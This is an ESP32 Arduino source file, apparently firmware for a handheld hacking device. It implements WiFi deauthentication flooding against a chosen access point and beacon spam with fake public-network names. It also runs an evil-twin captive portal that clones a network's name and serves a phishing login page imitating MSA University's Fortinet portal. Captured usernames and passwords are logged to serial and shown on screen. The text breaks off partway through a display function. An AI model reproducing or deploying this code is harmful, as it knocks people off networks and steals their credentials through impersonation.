//////////////////////////////////////////////////////////////
// CyberDeck Pro
// wifi.ino - WiFi Scanner + Deauther + Beacon Spam + Captive Portal
// Features: Scan networks, Deauth attack, Beacon Spam, Captive Portal
// NEW: User selects network, ESP creates fake network with same name (FREE)
//////////////////////////////////////////////////////////////

#include <esp_wifi.h>
#include <esp_wifi_types.h>
#include <WebServer.h>
#include <DNSServer.h>

//==========================================================
// WiFi State Machine
//==========================================================

enum WiFiState {
    WIFI_MENU,
    WIFI_SCANNING,
    WIFI_LIST,
    WIFI_DETAILS,
    WIFI_DEAUTHER_SCAN,
    WIFI_DEAUTHER_LIST,
    WIFI_DEAUTHER_ATTACK,
    WIFI_BEACON_ATTACK,
    WIFI_CAPTIVE_PORTAL,
    WIFI_SELECT_NETWORK,
    WIFI_FAKE_AP
};

WiFiState wifiState = WIFI_MENU;

//==========================================================
// WiFi Menu Items
//==========================================================

const char *wifiMenu[] = {
    "Scan Networks",
    "Deauther",
    "Beacon Spam",
    "Captive Portal",
    "Back"
};
const int wifiMenuLength = 5;
int wifiSelectedItem = 0;

//==========================================================
// WiFi Scanning
//==========================================================

#define MAX_WIFI_NETWORKS 30
#define MAX_SSID_LEN 32
#define CHANNEL_MAX 14
#define DEAUTH_BURST_COUNT 5
#define DEAUTH_REASON_COUNT 5

int wifiNetworkCount = 0;
int wifiSelectedNetwork = 0;
bool wifiScanComplete = false;
bool wifiScanInProgress = false;
unsigned long wifiScanStartTime = 0;
const unsigned long WIFI_SCAN_TIMEOUT = 15000;

String wifiSSID[MAX_WIFI_NETWORKS];
int32_t wifiRSSI[MAX_WIFI_NETWORKS];
String wifiBSSID[MAX_WIFI_NETWORKS];
int wifiChannel[MAX_WIFI_NETWORKS];

//==========================================================
// Deauther Variables
//==========================================================

struct DeauthAP {
    String ssid;
    String bssid;
    uint8_t bssidBytes[6];
    int rssi;
    int channel;
};

DeauthAP deauthAPs[MAX_WIFI_NETWORKS];
int deauthAPCount = 0;
int deauthSelectedIndex = 0;
int deauthPage = 0;

bool deauthRunning = false;
bool deauthScanning = false;
int deauthKickCount = 0;
int deauthTargetIndex = -1;
uint8_t deauthTargetBSSID[6];
int deauthTargetChannel = 1;
unsigned long deauthLastPacket = 0;
unsigned long deauthLastDisplay = 0;
int deauthPacketsSent = 0;
unsigned long deauthStartTime = 0;

//==========================================================
// Beacon Spam Variables
//==========================================================

bool beaconRunning = false;
unsigned long beaconLastPacket = 0;
unsigned long beaconLastDisplay = 0;
int beaconPacketsSent = 0;
int beaconSSIDIndex = 0;

const char* beaconSSIDs[] = {
    "Free Public WiFi",
    "Guest Network",
    "Starbucks WiFi",
    "McDonalds Free",
    "Airport WiFi",
    "Hotel Guest",
    "Cafe Internet",
    "Library WiFi",
    "Mall Wireless",
    "Fast WiFi"
};
const int BEACON_SSID_COUNT = 10;

//==========================================================
// Captive Portal Variables
//==========================================================

WebServer server(80);
DNSServer dnsServer;
const byte DNS_PORT = 53;
bool portalRunning = false;
String capturedUsername = "";
String capturedPassword = "";
bool credentialsCaptured = false;
String selectedNetwork = "";
String fakeAPName = "";
bool fakeAPRunning = false;

// HTML for captive portal (MSA University style)
String getPortalHTML() {
    String html = R"rawliteral(
<!DOCTYPE html>
<html lang="ar" dir="ltr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>MSA University - Captive Wi-Fi</title>
<style>
  * { box-sizing: border-box; }
  html, body { height: 100%; }
  body {
    margin: 0;
    padding: 40px 16px;
    background: #ffffff;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    display: flex;
    justify-content: center;
    min-height: 100vh;
  }
  form, input, button {
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
  }
  .auth-container {
    box-sizing: border-box;
    width: 360px;
    max-width: 100%;
    height: fit-content;
    border: 2px solid #D30000;
    border-radius: 0;
    overflow: hidden;
  }
  .top-section {
    background: #F2F2F2;
    padding: 18px 16px 6px;
    text-align: center;
  }
  .logo {
    display: inline-flex;
    align-items: center;
    justify-content: center;
    margin-bottom: 8px;
  }
  .fortinet-logo-img {
    height: 20px;
    width: auto;
    display: inline-block;
  }
  .uni-name {
    color: #D30000;
    font-size: 30px;
    font-weight: 800;
    letter-spacing: -0.3px;
    margin: 0;
    line-height: 1.05;
    transform: scale(1.02, 1);
    transform-origin: center;
  }
  .auth-required {
    color: #1a1a1a;
    font-size: 14px;
    font-weight: 700;
    letter-spacing: -0.3px;
    margin: 2px 0 0;
  }
  .bottom-section {
    background: #CCCCCC;
    padding: 12px 7px 40px;
    text-align: center;
  }
  .instructions {
    color: #1a1a1a;
    font-size: 12.5px;
    font-weight: 700;
    letter-spacing: -0.4px;
    white-space: nowrap;
    margin: 0 0 8px;
    line-height: 1.3;
  }
  .instructions.sub {
    margin-bottom: 14px;
  }
  .form-fields {
    width: 274px;
    max-width: 100%;
    margin: 0 auto;
  }
  .field-row {
    display: flex;
    align-items: center;
    margin-bottom: 8px;
  }
  .field-row label {
    flex: 0 0 82px;
    text-align: right;
    padding-right: 6px;
    font-size: 13px;
    font-weight: 600;
    letter-spacing: -0.3px;
    color: #1a1a1a;
    white-space: nowrap;
  }
  .field-row input {
    flex: 0 0 165px;
    width: 165px;
    height: 16px;
    padding: 0 10px;
    border: none;
    border-radius: 4px;
    font-size: 11px;
    letter-spacing: -0.3px;
    background: #ffffff;
    box-shadow: inset 0 0 0 1px rgba(0,0,0,0.08);
  }
  .continue-row {
    display: flex;
    justify-content: flex-end;
    width: 274px;
    max-width: 100%;
    margin: 10px auto 14px;
  }
  .continue-btn {
    background: #1675e0;
    color: #fff;
    border: 1px solid #FFFFFF;
    border-radius: 999px;
    width: 60px;
    margin-right: -3px;
    padding: 3px 0;
    text-align: center;
    font-size: 10px;
    font-weight: 700;
    letter-spacing: -0.3px;
    cursor: pointer;
  }
  .continue-btn:hover {
    background: #125fb8;
  }
  .it-dept {
    color: #D30000;
    font-size: 13.5px;
    font-weight: 700;
    letter-spacing: -0.3px;
    margin: 0;
    text-align: center;
  }
  .network-info {
    color: #1a1a1a;
    font-size: 12px;
    font-weight: 600;
    margin: 5px 0;
    background: #e0e0e0;
    padding: 5px;
    border-radius: 4px;
  }
</style>
</head>
<body>
  <div class="auth-container">
    <div class="top-section">
      <div class="logo">
        <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 20'%3E%3Ctext y='15' font-size='14' font-weight='bold' fill='%23D30000'%3EFortinet%3C/text%3E%3C/svg%3E" alt="Fortinet" class="fortinet-logo-img">
      </div>
      <div class="uni-name">MSA University</div>
      <div class="auth-required">Authentication Required</div>
    </div>
    <div class="bottom-section">
      <form action="/login" method="POST">
        <p class="instructions">Please enter your user name and password to continue</p>
        <p class="instructions sub">(the same one as you use for your computer account)</p>
        <div class="network-info">🌐 Network: )rawliteral";
    html += selectedNetwork;
    html += R"rawliteral(</div>
        <div class="form-fields">
          <div class="field-row">
            <label for="username">Username:</label>
            <input type="text" id="username" name="username" autocomplete="off">
          </div>
          <div class="field-row">
            <label for="password">Password:</label>
            <input type="password" id="password" name="password" autocomplete="off">
          </div>
        </div>
        <div class="continue-row">
          <button type="submit" class="continue-btn">Continue</button>
        </div>
      </form>
      <p class="it-dept">IT Departement</p>
    </div>
  </div>
</body>
</html>
)rawliteral";
    return html;
}

//==========================================================
// Deauth Frame Structure
//==========================================================

struct __attribute__((packed)) DeauthFrame {
    uint16_t frameControl;
    uint16_t duration;
    uint8_t dest[6];
    uint8_t source[6];
    uint8_t bssid[6];
    uint16_t seqCtrl;
    uint16_t reasonCode;
};

struct __attribute__((packed)) BeaconFrame {
    uint16_t frameControl;
    uint16_t duration;
    uint8_t dest[6];
    uint8_t source[6];
    uint8_t bssid[6];
    uint16_t seqCtrl;
    uint64_t timestamp;
    uint16_t beaconInterval;
    uint16_t capabilities;
    uint8_t tagID;
    uint8_t tagLen;
    uint8_t ssid[32];
};

DeauthFrame deauthFrame;
BeaconFrame beaconFrame;

//==========================================================
// ESP-IDF Raw TX
//==========================================================

extern "C" {
    int ieee80211_raw_frame_sanity_check(int32_t, int32_t, int32_t);
}

int ieee80211_raw_frame_sanity_check(int32_t, int32_t, int32_t) { return 0; }

extern esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buf, int len, bool en_sys_seq);

//==========================================================
// Function Prototypes
//==========================================================

void drawCaptivePortalCapture();
void drawCaptivePortalScreen();
void startCaptivePortal();
void stopCaptivePortal();
void handleCaptivePortal();
void drawNetworkSelection();
void startFakeAP();

//==========================================================
// Drawing Functions
//==========================================================

void drawWiFiHeader(const char *title) {
    tft.fillRect(0, 0, 480, 40, TFT_DARKGREY);
    tft.setTextColor(TFT_WHITE, TFT_DARKGREY);
    tft.drawCentreString(title, 240, 10, 4);
}

void drawWiFiFooter() {
    tft.drawFastHLine(0, 292, 480, TFT_DARKGREY);
    tft.setTextColor(TFT_DARKGREY, TFT_BLACK);
    tft.drawCentreString("UP/DOWN SELECT BACK", 240, 300, 2);
}

//==========================================================
// CAPTIVE PORTAL FUNCTIONS
//==========================================================

void handleRoot() {
    server.send(200, "text/html", getPortalHTML());
}

void handleLogin() {
    if (server.hasArg("username") && server.hasArg("password")) {
        capturedUsername = server.arg("username");
        capturedPassword = server.arg("password");
        credentialsCaptured = true;
        
        Serial.println("========================================");
        Serial.println("[CAPTIVE PORTAL] CREDENTIALS CAPTURED!");
        Serial.println("Network: " + selectedNetwork);
        Serial.println("Username: " + capturedUsername);
        Serial.println("Password: " + capturedPassword);
        Serial.println("========================================");
        
        // Send success page
        String successHTML = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Success</title>
<style>
body {
    margin: 0;
    padding: 40px 16px;
    background: #ffffff;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    display: flex;
    justify-content: center;
    min-height: 100vh;
}
.container {
    width: 360px;
    max-width: 100%;
    border: 2px solid #00AA00;
    border-radius: 0;
    padding: 40px 20px;
    text-align: center;
    background: #F2F2F2;
}
h1 {
    color: #00AA00;
    font-size: 24px;
}
p {
    color: #1a1a1a;
    font-size: 14px;
}
</style>
</head>
<body>
<div class="container">
    <h1>✅ Authentication Successful</h1>
    <p>You are now connected to the network.</p>
    <p>You may close this window and continue browsing.</p>
</div>
</body>
</html>
)rawliteral";
        server.send(200, "text/html", successHTML);
    } else {
        server.send(400, "text/html", "Missing username or password");
    }
}

void handleNotFound() {
    server.sendHeader("Location", "/", true);
    server.send(302, "text/plain", "");
}

void startCaptivePortal() {
    if (portalRunning) return;
    
    Serial.println("[CAPTIVE] Starting Captive Portal...");
    
    WiFi.mode(WIFI_AP);
    String apName = selectedNetwork + " FREE";
    WiFi.softAP(apName.c_str(), "");
    
    dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
    
    server.on("/", handleRoot);
    server.on("/login", HTTP_POST, handleLogin);
    server.onNotFound(handleNotFound);
    server.begin();
    
    portalRunning = true;
    credentialsCaptured = false;
    fakeAPRunning = true;
    fakeAPName = apName;
    
    Serial.println("[CAPTIVE] Captive Portal started!");
    Serial.print("[CAPTIVE] AP IP: ");
    Serial.println(WiFi.softAPIP());
    Serial.println("[CAPTIVE] AP Name: " + apName);
    Serial.println("[CAPTIVE] Credentials will be captured and displayed");
}
void stopCaptivePortal() {
    if (!portalRunning) return;
    
    dnsServer.stop();
    server.stop();
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_STA);
    
    portalRunning = false;
    fakeAPRunning = false;
    Serial.println("[CAPTIVE] Captive Portal stopped");
}

void handleCaptivePortal() {
    if (!portalRunning) return;
    
    dnsServer.processNextRequest();
    server.handleClient();
    
    if (credentialsCaptured) {
        drawCaptivePortalCapture();
        credentialsCaptured = false;
    }
}

//==========================================================
// NETWORK SELECTION SCREEN
//==========================================================

void drawNetworkSelection() {
    static bool firstDraw = true;
    if (firstDraw) {
        tft.fillScreen(TFT_BLACK);
        drawWiFiHeader("Select Network");
        firstDraw = false;
    }
    
    int y = 55;
    int visible = 5;
    
    for(int i = 0; i < visible; i++) {
        int index = i + wifiSelectedNetwork;
        if(index >= wifiNetworkCount) break;
        
        String displayName = wifiSSID[index];
        if(displayName.length() == 0) displayName = "<Hidden>";
        
        if(index == wifiSelectedNetwork) {
            tft.fillRoundRect(18, y - 4, 440, 38, 8, TFT_BLUE);
            tft.setTextColor(TFT_WHITE, TFT_BLUE);
            tft.drawString(">", 30, y, 4);
            tft.drawString(displayName, 55, y, 4);
            tft.setTextColor(TFT_CYAN, TFT_BLUE);
            tft.drawRightString(String(wifiRSSI[index]) + " dBm", 460, y, 2);
        } else {
            tft.setTextColor(TFT_LIGHTGREY, TFT_BLACK);
            tft.drawString(displayName, 55, y, 4);
            tft.setTextColor(TFT_DARKGREY, TFT_BLACK);
            tft.drawRightString(String(wifiRSSI[index]) + " dBm", 460, y, 2);
        }
        y += 48;
    }
    
    tft.setTextColor(TFT_DARKGREY, TFT_BLACK);
    tft.drawCentreString("SELECT network to clone as FREE AP", 240, 280, 2);
    
    drawWiFiFooter();
}

void drawCaptivePortalScreen() {
    static bool firstDraw = true;
    if (firstDraw) {
        tft.fillScreen(TFT_BLACK);
        drawWiFiHeader("CAPTIVE PORTAL");
        firstDraw = false;
    }
    
    int y = 50;
    int lineH = 30;
    
    tft.setTextColor(TFT_CYAN, TFT_BLACK);
    tft.setTextSize(2);
    tft.drawString("Status:", 30, y, 2);
    tft.setTextColor(portalRunning ? TFT_GREEN : TFT_RED, TFT_BLACK);
    tft.drawString(portalRunning ? "ACTIVE" : "STOPPED", 250, y, 2);
    y += lineH + 10;
    
    if (portalRunning) {
        tft.setTextColor(TFT_YELLOW, TFT_BLACK);
        tft.setTextSize(1);
        tft.drawString("AP:", 30, y, 2);
        tft.setTextColor(TFT_WHITE, TFT_BLACK);
        tft.drawString(fakeAPName, 120, y, 2);
        y += 25;
        
        tft.setTextColor(TFT_CYAN, TFT_BLACK);
        tft.drawString("Original:", 30, y, 2);
        tft.setTextColor(TFT_WHITE, TFT_BLACK);
        tft.drawString(selectedNetwork, 150, y, 2);
        y += 25;
        
        tft.setTextColor(TFT_WHITE, TFT_BLACK);
        tft.drawString("IP:", 30, y, 2);
        tft.setTextColor(TFT_CYAN, TFT_BLACK);
        tft.drawString(WiFi.softAPIP().toString(), 120, y, 2);
        y += 30;
        
        if (capturedUsername.length() > 0 || capturedPassword.length() > 0) {
            tft.setTextColor(TFT_GREEN, TFT_BLACK);
            tft.drawCentreString("✓ CREDENTIALS CAPTURED!", 240, y, 2);
            y += 30;
            
            tft.setTextColor(TFT_YELLOW, TFT_BLACK);
            tft.drawString("User:", 30, y, 2);
            tft.setTextColor(TFT_WHITE, TFT_BLACK);
            tft.drawString(capturedUsername, 150, y, 2);
            y += 25;
            
            tft.setTextColor(TFT_YELLOW, TFT_BLACK);
            tft.drawString("Pass:", 30, y, 2);
            tft.setTextColor(TFT_WHITE, TFT_BLACK);
            tft.drawString(capturedPassword, 150, y, 2);
            y += 30;
        } else {
            tft.setTextColor(TFT_DARKGREY, TFT_BLACK);
            tft.drawCentreString("Waiting for victims...", 240, y, 2);
            y += 30;
        }
        
        // Activity bar
        int barX = 40;
        int barY = 250;
        int barWidth = 400;
        int barHeight = 20;
        int pos = (millis() / 50) % barWidth;
        
        tft.fillRect(barX, barY, barWidth, barHeight, TFT_DARKGREY);
        tft.fillRect(barX + pos - 10, barY, 20, barHeight, TFT_GREEN);
        
        tft.setTextColor(TFT_GREEN, TFT_BLACK);
        tft.setTextSize(1);
        tft.drawCentreString("🔵 Fake AP: " + fakeAPName, 240, 278, 2);
        tft.drawCentreString("SELECT to stop | BACK to exit", 240, 290, 1);
    } else {
        tft.setTextColor(TFT_DARKGREY, TFT_BLACK);
        tft.setTextSize(1);
        tft.drawCentreString("SELECT to start Captive Portal", 240, 150, 2);
        tft.drawCentreString("AP will be: " + selectedNetwork + " FREE", 240, 180, 2);
    }
    
    drawWiFiFooter();
}

void drawCaptivePortalCapture() {
    tft.fillScreen(TFT_BLACK);
    drawWiFiHeader("CREDENTIALS CAPTURED!");
    
    int y = 50;
    int lineH = 35;
    
    tft.setTextColor(TFT_GREEN, TFT_BLACK);
    tft.setTextSize(2);
    tft.drawCentreString("✓ CAPTURED!", 240, y, 2);
    y += lineH + 10;
    
    tft.setTextColor(TFT_YELLOW, TFT_BLACK);
    tft.setTextSize(1);
    tft.drawString("Network:", 30, y, 2);
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    tft.drawString(selectedNetwork, 200, y, 2);
    y += lineH;
    
    tft.setTextColor(TFT_YELLOW, TFT_BLACK);
    tft.drawString("Username:", 30, y, 2);
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    tft.drawString(capturedUsername, 200, y, 2);
    y += lineH;
    
    tft.setTextColor(TFT_YELLOW, TFT_BLACK);
    tft.drawString("Password:", 30, y, 2);
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    tft.drawString(capturedPassword, 200, y, 2);
    y += lineH + 10;
    
    tft.setTextColor(TFT_DARKGREY, TFT_BLACK);
    tft.setTextSize(1);
    tft.drawCentreString("Credentials saved to serial monitor", 240, y, 2);
    y += 25;
    tft.drawCentreString("Press BACK to continue", 240, y, 2);
    
    drawWiFiFooter();
}

//==========================================================
// DEAUTHER FUNCTIONS
//==========================================================

void deauthSetChannel(int channel) {
    if(channel < 1 || channel > CHANNEL_MAX) return;
    esp_wifi_set_channel((uint8_t)channel, WIFI_SECOND_CHAN_NONE);
}

void deauthSendPacket(uint8_t *bssid, uint8_t *target, int channel, uint16_t reason) {
    deauthSetChannel(channel);
    
    deauthFrame.frameControl = 0x00C0;
    deauthFrame.duration = 0x0000;
    memcpy(deauthFrame.dest, target, 6);
    memcpy(deauthFrame.source, bssid, 6);
    memcpy(deauthFrame.bssid, bssid, 6);
    deauthFrame.seqCtrl = random(0, 4096);
    deauthFrame.reasonCode = reason;
    
    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, &deauthFrame, sizeof(deauthFrame), false);
    
    if(err == ESP_OK) {
        deauthKickCount++;
        deauthPacketsSent++;
    }
}

void deauthAttack() {
    if(!deauthRunning) return;
    
    uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    uint16_t reasons[] = {0x07, 0x01, 0x04, 0x08, 0x0A};
    
    for(int r = 0; r < DEAUTH_REASON_COUNT; r++) {
        for(int i = 0; i < DEAUTH_BURST_COUNT; i++) {
            deauthSendPacket(deauthTargetBSSID, broadcast, deauthTargetChannel, reasons[r]);
            delayMicroseconds(100);
        }
    }
    
    for(int i = 0; i < 5; i++) {
        deauthSendPacket(deauthTargetBSSID, broadcast, deauthTargetChannel, 0x07);
        delayMicroseconds(50);
    }
}

void deauthScanNetworks() {
    deauthScanning = true;
    deauthAPCount = 0;
    
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);
    
    int n = WiFi.scanNetworks();
    if(n > MAX_WIFI_NETWORKS) n = MAX_WIFI_NETWORKS;
    
    for(int i = 0; i < n; i++) {
        deauthAPs[i].ssid = WiFi.SSID(i);
        if(deauthAPs[i].ssid.length() == 0) deauthAPs[i].ssid = "Hidden";
        deauthAPs[i].bssid = WiFi.BSSIDstr(i);
        deauthAPs[i].rssi = WiFi.RSSI(i);
        deauthAPs[i].channel = WiFi.channel(i);
        const uint8_t* bssid = WiFi.BSSID(i);
        if(bssid) {
            memcpy(deauthAPs[i].bssidBytes, bssid, 6);
        }
    }
    
    deauthAPCount = n;
    deauthScanning = false;
}

void deauthStart(int index) {
    if(deauthRunning) return;
    if(index < 0 || index >= deauthAPCount) return;
    
    deauthTargetIndex = index;
    deauthKickCount = 0;
    deauthPacketsSent = 0;
    deauthTargetChannel = deauthAPs[index].channel;
    memcpy(deauthTargetBSSID, deauthAPs[index].bssidBytes, 6);
    deauthStartTime = millis();
    
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);
    
    esp_wifi_set_channel(deauthTargetChannel, WIFI_SECOND_CHAN_NONE);
    
    deauthFrame.frameControl = 0x00C0;
    deauthFrame.duration = 0x0000;
    deauthFrame.reasonCode = 0x0007;
    deauthFrame.seqCtrl = 0;
    
    esp_wifi_set_promiscuous(true);
    
    deauthRunning = true;
    deauthLastPacket = 0;
    deauthLastDisplay = 0;
}

void deauthStop() {
    if(!deauthRunning) return;
    
    deauthRunning = false;
    deauthTargetIndex = -1;
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
}

//==========================================================
// BEACON SPAM FUNCTIONS
//==========================================================

void beaconSetChannel(int channel) {
    if(channel < 1 || channel > CHANNEL_MAX) return;
    esp_wifi_set_channel((uint8_t)channel, WIFI_SECOND_CHAN_NONE);
}

void beaconSendPacket(int channel, const char* ssid, uint8_t* bssid) {
    beaconSetChannel(channel);
    
    beaconFrame.frameControl = 0x0080;
    beaconFrame.duration = 0x0000;
    memset(beaconFrame.dest, 0xFF, 6);
    memcpy(beaconFrame.source, bssid, 6);
    memcpy(beaconFrame.bssid, bssid, 6);
    beaconFrame.seqCtrl = random(0, 4096);
    beaconFrame.timestamp = 0x0000000000000000ULL;
    beaconFrame.beaconInterval = 0x0064;
    beaconFrame.capabilities = 0x0021;
    
    beaconFrame.tagID = 0x00;
    int ssidLen = strlen(ssid);
    if(ssidLen > 32) ssidLen = 32;
    beaconFrame.tagLen = ssidLen;
    memcpy(beaconFrame.ssid, ssid, ssidLen);
    
    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, &beaconFrame, 
                                      sizeof(beaconFrame), false);
    
    if(err == ESP_OK) {
        beaconPacketsSent++;
    }
}

void beaconStart() {
    if(beaconRunning) return;
    
    beaconRunning = true;
    beaconPacketsSent = 0;
    beaconSSIDIndex = 0;
    beaconLastPacket = 0;
    beaconLastDisplay = 0;
    
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);
    
    esp_wifi_set_promiscuous(true);
}

void beaconStop() {
    if(!beaconRunning) return;
    
    beaconRunning = false;
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
}

void beaconAttack() {
    if(!beaconRunning) return;
    
    uint8_t bssid[6];
    bssid[0] = 0xAA;
    bssid[1] = 0xBB;
    bssid[2] = 0xCC;
    bssid[3] = random(0x00, 0xFF);
    bssid[4] = random(0x00, 0xFF);
    bssid[5] = random(0x00, 0xFF);
    
    int channel = (beaconSSIDIndex % CHANNEL_MAX) + 1;
    int ssidIdx = beaconSSIDIndex % BEACON_SSID_COUNT;
    const char* ssid = beaconSSIDs[ssidIdx];
    
    beaconSendPacket(channel, ssid, bssid);
    
    beaconSSIDIndex++;
    delay(20);
}

//==========================================================
// WiFi Functions
//==========================================================

void performWiFiScan() {
    wifiScanInProgress = true;
    wifiScanComplete = false;
    
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);
    
    wifiNetworkCount = WiFi.scanNetworks();
    if(wifiNetworkCount > MAX_WIFI_NETWORKS) wifiNetworkCount = MAX_WIFI_NETWORKS;
    
    for(int i = 0; i < wifiNetworkCount; i++) {
        wifiSSID[i] = WiFi.SSID(i);
        if(wifiSSID[i].length() == 0) wifiSSID[i] = "Hidden";
        wifiRSSI[i] = WiFi.RSSI(i);
        wifiBSSID[i] = WiFi.BSSIDstr(i);
        wifiChannel[i] = WiFi.channel(i);
    }
    
    wifiScanComplete = true;
    wifiScanInProgress = false;
}

//==========================================================
// Drawing Functions
//==========================================================

void drawWiFiMenu() {
    tft.fillScreen(TFT_BLACK);
    drawWiFiHeader("WiFi Tools");
    
    int y = 75;
    for(int i = 0; i < wifiMenuLength; i++) {
        if(i == wifiSelectedItem) {
            tft.fillRoundRect(50, y - 4, 380, 40, 8, TFT_BLUE);
            tft.setTextColor(TFT_WHITE, TFT_BLUE);
            tft.drawCentreString(wifiMenu[i], 240, y, 4);
        } else {
            tft.setTextColor(TFT_LIGHTGREY, TFT_BLACK);
            tft.drawCentreString(wifiMenu[i], 240, y, 4);
        }
        y += 50;
    }
    drawWiFiFooter();
}

void drawScanningScreen() {
    tft.fillScreen(TFT_BLACK);
    drawWiFiHeader("Scanning");
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    tft.drawCentreString("Searching for networks...", 240, 140, 4);
    
    static int dotCount = 0;
    dotCount = (dotCount + 1) % 4;
    String dots = "";
    for(int i = 0; i < dotCount; i++) dots += ".";
    tft.drawCentreString(dots, 240, 180, 4);
    drawWiFiFooter();
}

void drawNetworkList() {
    tft.fillScreen(TFT_BLACK);
    drawWiFiHeader("Networks");
    
    int y = 55;
    int visible = 5;
    
    for(int i = 0; i < visible; i++) {
        int index = i + wifiSelectedNetwork;
        if(index >= wifiNetworkCount) break;
        
        if(index == wifiSelectedNetwork) {
            tft.fillRoundRect(18, y - 4, 440, 38, 8, TFT_BLUE);
            tft.setTextColor(TFT_WHITE, TFT_BLUE);
            tft.drawString(">", 30, y, 4);
            tft.drawString(wifiSSID[index], 55, y, 4);
            tft.setTextColor(TFT_CYAN, TFT_BLUE);
            tft.drawRightString(String(wifiRSSI[index]) + " dBm", 460, y, 2);
        } else {
            tft.setTextColor(TFT_LIGHTGREY, TFT_BLACK);
            tft.drawString(wifiSSID[index], 55, y, 4);
            tft.setTextColor(TFT_DARKGREY, TFT_BLACK);
            tft.drawRightString(String(wifiRSSI[index]) + " dBm", 460, y, 2);
        }
        y += 48;
    }
    
    tft.setTextColor(TFT_DARKGREY, TFT_BLACK);
    tft.drawCentreString("Total: " + String(wifiNetworkCount), 240, 280, 2);
    drawWiFiFooter();
}

void drawDeautherScanScreen() {
    tft.fillScreen(TFT_BLACK);
    drawWiFiHeader("Deauther Scan");
    
    tft.setTextColor(TFT_CYAN, TFT_BLACK);
    tft.setTextSize(2);
    if(deauthScanning) {
        tft.drawCentreString("Scanning for APs...", 240, 120, 2);
        static int dotCount = 0;
        dotCount = (dotCount + 1) % 4;
        String dots = "";
        for(int i = 0; i < dotCount; i++) dots += ".";
        tft.setTextColor(TFT_LIGHTGREY, TFT_BLACK);
        tft.drawCentreString(dots, 240, 160, 4);
    } else if(deauthAPCount == 0) {
        tft.drawCentreString("No APs Found", 240, 120, 2);
        tft.setTextColor(TFT_DARKGREY, TFT_BLACK);
        tft.setTextSize(1);
        tft.drawCentreString("SELECT to rescan", 240, 160, 2);
    } else {
        tft.setTextColor(TFT_GREEN, TFT_BLACK);
        tft.drawCentreString("Found " + String(deauthAPCount) + " APs", 240, 120, 2);
        tft.setTextColor(TFT_DARKGREY, TFT_BLACK);
        tft.setTextSize(1);
        tft.drawCentreString("SELECT to view list", 240, 160, 2);
    }
    drawWiFiFooter();
}

void drawDeautherList() {
    tft.fillScreen(TFT_BLACK);
    drawWiFiHeader("Select Target");
    
    int itemsPerPage = 5;
    int startIdx = deauthPage * itemsPerPage;
    int endIdx = min(startIdx + itemsPerPage, deauthAPCount);
    
    int y = 55;
    for(int i = startIdx; i < endIdx; i++) {
        int idx = i - startIdx;
        int yPos = y + (idx * 42);
        bool selected = (i == deauthSelectedIndex);
        
        if(selected) {
            tft.fillRoundRect(18, yPos - 4, 440, 38, 8, TFT_RED);
            tft.setTextColor(TFT_WHITE, TFT_RED);
            tft.drawString("⚡", 35, yPos, 4);
            tft.drawString(deauthAPs[i].ssid, 65, yPos, 4);
            tft.setTextColor(TFT_CYAN, TFT_RED);
            tft.drawRightString("CH" + String(deauthAPs[i].channel), 460, yPos, 2);
        } else {
            tft.setTextColor(TFT_LIGHTGREY, TFT_BLACK);
            tft.drawString(deauthAPs[i].ssid, 65, yPos, 4);
            tft.setTextColor(TFT_DARKGREY, TFT_BLACK);
            tft.drawRightString("CH" + String(deauthAPs[i].channel), 460, yPos, 2);
        }
    }
    
    int totalPages = (deauthAPCount + itemsPerPage - 1) / itemsPerPage;
    tft.setTextColor(TFT_DARKGREY, TFT_BLACK);
    tft.drawCentreString("Page " + String(deauthPage + 1) + "/" + String(max(1, totalPages)), 240, 275, 2);
    drawWiFiFooter();
}

void drawDeautherAttack() {
    tft.fillScreen(TFT_BLACK);
    drawWiFiHeader("⚡ DEAUTH ATTACK ⚡");
    
    int y = 50;
    int lineH = 30;
    
    tft.setTextColor(TFT_RED, TFT_BLACK);
    tft.setTextSize(2);
    tft.drawCentreString(">> ATTACK ACTIVE <<", 240, y, 2);
    y += lineH + 10;
    
    if(deauthTargetIndex >= 0 && deauthTargetIndex < deauthAPCount) {
        tft.setTextColor(TFT_CYAN, TFT_BLACK);
        tft.setTextSize(1);
        tft.drawString("Target:", 30, y, 2);
        tft.setTextColor(TFT_WHITE, TFT_BLACK);
        tft.drawString(deauthAPs[deauthTargetIndex].ssid, 180, y, 2);
        y += lineH;
        
        tft.setTextColor(TFT_CYAN, TFT_BLACK);
        tft.drawString("BSSID:", 30, y, 2);
        tft.setTextColor(TFT_WHITE, TFT_BLACK);
        tft.drawString(deauthAPs[deauthTargetIndex].bssid, 180, y, 2);
        y += lineH;
        
        tft.setTextColor(TFT_CYAN, TFT_BLACK);
        tft.drawString("Channel:", 30, y, 2);
        tft.setTextColor(TFT_YELLOW, TFT_BLACK);
        tft.drawString(String(deauthTargetChannel), 180, y, 2);
        y += lineH;
    }
    
    tft.setTextColor(TFT_CYAN, TFT_BLACK);
    tft.drawString("Packets Sent:", 30, y, 2);
